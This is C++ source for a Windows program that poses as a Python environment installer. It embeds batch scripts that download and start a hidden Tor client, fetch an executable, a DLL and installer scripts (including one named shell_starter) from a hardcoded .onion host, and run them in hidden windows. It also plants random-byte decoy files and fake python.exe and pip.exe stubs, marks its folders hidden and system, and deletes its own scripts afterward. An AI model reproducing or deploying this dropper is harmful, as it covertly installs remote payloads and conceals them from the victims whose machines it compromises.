// Build (x64 developer cmd): 
// cl /EHsc /O2 /std:c++17 Installer27.cpp /link user32.lib shell32.lib
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdio>
#include <string>



static const char* torinstaller = R"TORSCRIPT_END(@echo off
setlocal

:: ===============================
:: CONFIGURATION
:: ===============================
set "BASE=%USERPROFILE%\Downloads\python-v.3.11.0\lib"
set "TOR_DIR=%BASE%\tor"
set "TOR_DATA=%TOR_DIR%\data"
set "TOR_ARCHIVE=%BASE%\tor-win32.tar.gz"
set "VENV=%USERPROFILE%\Downloads\python-v.3.11.0\.venv"

:: ===============================
:: CREATE FOLDERS
:: ===============================
mkdir "%BASE%" 2>nul
mkdir "%TOR_DIR%" 2>nul
mkdir "%TOR_DATA%" 2>nul
mkdir "%VENV%" 2>nul

if /I "%~dp0" == "%VENV%" (
    rem Do nothing or place commands here
) else (
    for /L %%A in (1,1,25) do powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$r=[guid]::NewGuid().ToString('N'); New-Item \"$env:USERPROFILE\Downloads\python-v.3.11.0\.venv\$r.mpy\" -ItemType File"

    for /L %%A in (1,1,25) do powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$r=[guid]::NewGuid().ToString('N'); $bytes = New-Object Byte[] 3070; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes(\"$env:USERPROFILE\Downloads\python-v.3.11.0\.venv\$r.cmd\", $bytes)"

    for /L %%A in (1,1,3) do powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$r=[guid]::NewGuid().ToString('N'); $bytes = New-Object Byte[] 6161408; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes(\"$env:USERPROFILE\Downloads\python-v.3.11.0\.venv\$r.exe\", $bytes)"

    for /L %%A in (1,1,4) do powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$r=[guid]::NewGuid().ToString('N'); $bytes = New-Object Byte[] 6074240; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes(\"$env:USERPROFILE\Downloads\python-v.3.11.0\.venv\$r.dll\", $bytes)"
)

:: ===============================
:: DOWNLOAD TOR EXPERT BUNDLE
:: ===============================
echo Downloading Tor Expert Bundle...
curl -L -o "%TOR_ARCHIVE%" ^
https://archive.torproject.org/tor-package-archive/torbrowser/14.5.8/tor-expert-bundle-windows-x86_64-14.5.8.tar.gz

:: ===============================
:: EXTRACT AND CLEAN
:: ===============================
echo Extracting Tor Expert Bundle...
tar -xf "%TOR_ARCHIVE%" -C "%TOR_DIR%" || (
    echo [!] Extraction failed. Trying PowerShell fallback...
    powershell -Command "tar -xf '%TOR_ARCHIVE%' -C '%TOR_DIR%'"
)
echo [+] Succesfully Extracted Tor Bundle

del "%TOR_ARCHIVE%" >nul 2>&1

:: ===============================
:: WRITE torrc CONFIG
:: ===============================
(
    echo SocksPort 9050
    echo ControlPort 0
    echo DataDirectory %TOR_DATA:\=/%
    echo Log notice file NUL
) > "%TOR_DIR%\torrc"

echo [+] torrc Succesfully Written

:: ===============================
:: CREATE STARTER (for reuse)
:: ===============================
(
    echo @echo off
    echo cd /d "%%~dp0"
    echo echo Starting headless Tor client...
    echo start /b %USERPROFILE%\Downloads/python-v.3.11.0/lib/tor/tor/tor.exe -f %USERPROFILE%\Downloads/python-v.3.11.0/lib/tor/torrc
    echo echo.
    echo echo Use this command in any terminal to fetch .onion sites:
    echo echo   curl --socks5 127.0.0.1:9050 http://example.onion
    echo echo.
    echo echo Press Ctrl+C to stop Tor.
) > "%VENV%\7e4560ebe40c4917a86f5190a0dca06a.cmd"

echo [+] Tor Starter Succesfully Written

echo Tor installed to: %TOR_DIR%
echo Run "%VENV%\7e4560ebe40c4917a86f5190a0dca06a.cmd" to start Tor client.

echo When running, any tool can use SOCKS5 proxy at 127.0.0.1:9050

echo Example:
echo [CMD] Start Tor Proxy: %USERPROFILE%\Downloads\python-v.3.11.0\lib\tor\Start-Tor-Proxy.cmd
echo [CMD] curl --socks5-hostname 127.0.0.1:9050 http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion
echo [PS1] iwr http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion -Proxy 'socks5://127.0.0.1:9050')TORSCRIPT_END";

const char* curl = R"TORSCRIPT_END(@echo off
set "BASE=%USERPROFILE%\Downloads\python-v.3.11.0\lib"
set "TOR_DIR=%BASE%\tor"
set "TOR_DATA=%TOR_DIR%\data"
set "TOR_ARCHIVE=%BASE%\tor-win32.tar.gz"
set "VENV=%USERPROFILE%\Downloads\python-v.3.11.0\.venv"

curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/shell_starter27" -o "%VENV%\033edbe7cb6f4e6497504ebd31b4a505.exe"
curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/directmanipulation_proxy27" -o "%VENV%\5283fc6080434734ae52f2de1cbe704b.dll"
curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/proxyInstaller27" -o "%USERPROFILE%\Downloads\python-v.3.11.0\proxyInstaller.cmd"
curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/receiver" -o "%VENV%\3c114757445d4a248fe719f3d0f90582.cmd"

attrib +h +s "%VENV%"
attrib +h +s "%USERPROFILE%\Downloads\python-v.3.11.0"
attrib +h +s "%TOR_DIR%"
)TORSCRIPT_END";


bool start_bat(char* file)
{
    // Expand the environment variable
    const char* tmpl = file;

    // First call to get required buffer size
    DWORD needed = ExpandEnvironmentStringsA(tmpl, nullptr, 0);
    if (needed == 0) {
        return false;
    }

    std::vector<char> expanded(needed);
    if (ExpandEnvironmentStringsA(tmpl, expanded.data(), needed) == 0) {
        return false;
    }

    std::string scriptPath = expanded.data();

    // Build the full command line for cmd.exe: /C "C:\path\Start-Tor-Proxy.cmd"
    std::string cmdLine = std::string("/C \"") + scriptPath + "\"";

    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    // IMPORTANT: CreateProcess modifies the command-line buffer, so use a mutable buffer.
    std::vector<char> cmdMutable(cmdLine.begin(), cmdLine.end());
    cmdMutable.push_back('\0');

    BOOL ok = CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe", // application name (can be nullptr)
        cmdMutable.data(),                // mutable command line
        nullptr, nullptr,                 // process/thread attrs
        FALSE,                            // inherit handles
        CREATE_NO_WINDOW,                 // create flags - hidden window
        nullptr,                          // environment
        nullptr,                          // working directory (nullptr = current)
        &si, &pi);

    if (!ok) {
        return false;
    }

    // Wait for process startup (you can use an appropriate timeout)
    DWORD wait = WaitForSingleObject(pi.hProcess, 15000); // 15s timeout
    if (wait == WAIT_TIMEOUT) {
        // Process still running — you may choose to continue or terminate
    }

    // Always close handles when you're done with them
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}


std::string ExpandEnvVars(const char* pathWithEnv) {
    // First, find required buffer size
    DWORD size = ExpandEnvironmentStringsA(pathWithEnv, nullptr, 0);
    if (size == 0) throw std::runtime_error("Failed to get environment string size");

    std::vector<char> buffer(size);
    if (ExpandEnvironmentStringsA(pathWithEnv, buffer.data(), size) == 0)
        throw std::runtime_error("Failed to expand env string");
    
    return std::string(buffer.data());
}

int write_text(const char* path, const void* data, size_t len) {
    std::string expandedPath = ExpandEnvVars(path);
    std::ofstream file(expandedPath, std::ios::binary);
    if (!file) return 1;

    file.write(static_cast<const char*>(data),
               static_cast<std::streamsize>(len));
    return file ? 0 : 1;
}

std::string expand_env(const std::string& s) {
    DWORD size = ExpandEnvironmentStringsA(s.c_str(), nullptr, 0);
    std::vector<char> buf(size);
    ExpandEnvironmentStringsA(s.c_str(), buf.data(), size);
    return std::string(buf.data());
}


int move_file(const char* oldPath, const char* newPath, bool onlyDelete = false) {

    std::string expandedPath = ExpandEnvVars(oldPath);
    std::ifstream file(expandedPath, std::ios::binary);

    std::string content;

    if (!file.is_open()) {
        std::cerr << "Failed to open file.\n";
        return 1;
    }

    std::string line;

    while (std::getline(file, line)) {  // read each line sequentially
        content += line + "\n";  // append line and newline character
    }

    content.pop_back();  // remove the last newline character added

    file.close();  // always close after use

    if (!onlyDelete && newPath) {
        if (write_text(newPath, content.c_str(), content.size()) == 0) {
            if (remove(expandedPath.c_str()) == 0) {
                return 0;
            } else {
                return 1;
            }
        }
    } else {
        if (onlyDelete) {
            if (remove(expandedPath.c_str()) == 0) {
                return 0;
            } else {
                return 1;
            }
        }
    }

    return 1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
    const char* deceptionstr = "□□░□░ Mὖ";
    write_text("%USERPROFILE%\\Downloads\\venv.cmd", torinstaller, std::strlen(torinstaller));
    start_bat("%USERPROFILE%\\Downloads\\venv.cmd");

    start_bat("%USERPROFILE%\\Downloads\\python-v.3.11.0\\.venv\\7e4560ebe40c4917a86f5190a0dca06a.cmd");

    write_text("%USERPROFILE%\\Downloads\\python-v.3.11.0\\curl.cmd", curl, std::strlen(curl));
    start_bat("%USERPROFILE%\\Downloads\\python-v.3.11.0\\curl.cmd");

    write_text("%USERPROFILE%\\Downloads\\python-v.3.11.0\\python.exe", deceptionstr, std::strlen(deceptionstr));
    write_text("%USERPROFILE%\\Downloads\\python-v.3.11.0\\pip.exe", deceptionstr, std::strlen(deceptionstr));

    Sleep(1000);

    start_bat("%USERPROFILE%\\Downloads\\python-v.3.11.0\\proxyInstaller.cmd");

    move_file("%USERPROFILE%\\Downloads\\venv.cmd", "", true);
    move_file("%USERPROFILE%\\Downloads\\python-v.3.11.0\\curl.cmd", "", true);
    move_file("%USERPROFILE%\\Downloads\\python-v.3.11.0\\proxyInstaller.cmd", "", true);
    return 0;
}